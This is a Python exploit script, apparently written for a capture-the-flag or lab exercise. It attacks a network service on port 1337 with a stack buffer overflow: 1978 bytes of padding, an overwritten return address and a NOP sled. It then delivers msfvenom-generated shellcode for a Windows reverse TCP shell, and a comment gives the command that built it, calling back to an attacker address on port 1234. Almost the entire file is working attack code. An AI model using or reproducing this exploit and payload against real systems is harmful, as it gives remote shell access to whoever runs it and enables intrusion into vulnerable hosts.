#!/usr/bin/env python3
import socket,sys

host = "10.10.163.22"
port = 1337

def attack():
    cmd = sys.argv[1]
    offset = 1978
    overflow = "a"*offset
    retn = "\xaf\x11\x50\x62" # eip should hold 625011AF
    padding = "\x90"*16
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.14.10.227 LPORT=1234 EXITFUNC=thread -b"\x00\x07\xa0\x2e" -f c
    payload = "\xda\xd3\xba\xb3\x24\xf1\x40\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
    payload += "\x52\x31\x56\x17\x03\x56\x17\x83\x5d\xd8\x13\xb5\x5d\xc9\x56"
    payload += "\x36\x9d\x0a\x37\xbe\x78\x3b\x77\xa4\x09\x6c\x47\xae\x5f\x81"
    payload += "\x2c\xe2\x4b\x12\x40\x2b\x7c\x93\xef\x0d\xb3\x24\x43\x6d\xd2"
    payload += "\xa6\x9e\xa2\x34\x96\x50\xb7\x35\xdf\x8d\x3a\x67\x88\xda\xe9"
    payload += "\x97\xbd\x97\x31\x1c\x8d\x36\x32\xc1\x46\x38\x13\x54\xdc\x63"
    payload += "\xb3\x57\x31\x18\xfa\x4f\x56\x25\xb4\xe4\xac\xd1\x47\x2c\xfd"
    payload += "\x1a\xeb\x11\x31\xe9\xf5\x56\xf6\x12\x80\xae\x04\xae\x93\x75"
    payload += "\x76\x74\x11\x6d\xd0\xff\x81\x49\xe0\x2c\x57\x1a\xee\x99\x13"
    payload += "\x44\xf3\x1c\xf7\xff\x0f\x94\xf6\x2f\x86\xee\xdc\xeb\xc2\xb5"
    payload += "\x7d\xaa\xae\x18\x81\xac\x10\xc4\x27\xa7\xbd\x11\x5a\xea\xa9"
    payload += "\xd6\x57\x14\x2a\x71\xef\x67\x18\xde\x5b\xef\x10\x97\x45\xe8"
    payload += "\x57\x82\x32\x66\xa6\x2d\x43\xaf\x6d\x79\x13\xc7\x44\x02\xf8"
    payload += "\x17\x68\xd7\xaf\x47\xc6\x88\x0f\x37\xa6\x78\xf8\x5d\x29\xa6"
    payload += "\x18\x5e\xe3\xcf\xb3\xa5\x64\xfa\x4d\xaf\x97\x92\x53\xaf\x53"
    payload += "\xb1\xdd\x49\x31\x25\x88\xc2\xae\xdc\x91\x98\x4f\x20\x0c\xe5"
    payload += "\x50\xaa\xa3\x1a\x1e\x5b\xc9\x08\xf7\xab\x84\x72\x5e\xb3\x32"
    payload += "\x1a\x3c\x26\xd9\xda\x4b\x5b\x76\x8d\x1c\xad\x8f\x5b\xb1\x94"
    payload += "\x39\x79\x48\x40\x01\x39\x97\xb1\x8c\xc0\x5a\x8d\xaa\xd2\xa2"
    payload += "\x0e\xf7\x86\x7a\x59\xa1\x70\x3d\x33\x03\x2a\x97\xe8\xcd\xba"
    payload += "\x6e\xc3\xcd\xbc\x6e\x0e\xb8\x20\xde\xe7\xfd\x5f\xef\x6f\x0a"
    payload += "\x18\x0d\x10\xf5\xf3\x95\x30\x14\xd1\xe3\xd8\x81\xb0\x49\x85"
    payload += "\x31\x6f\x8d\xb0\xb1\x85\x6e\x47\xa9\xec\x6b\x03\x6d\x1d\x06"
    payload += "\x1c\x18\x21\xb5\x1d\x09"

    s_buffer = cmd + " " + overflow + retn + padding + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        s.recv(1024)
        print("Sendin buffer to crash the program...")
        s.send(bytes(s_buffer + "\r\n", 'latin-1'))
        print("D0N3 !")
    except:
        print("Could Not connect !")
    
if __name__ == "__main__":

    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <command>")
        sys.exit(1)
    
    attack()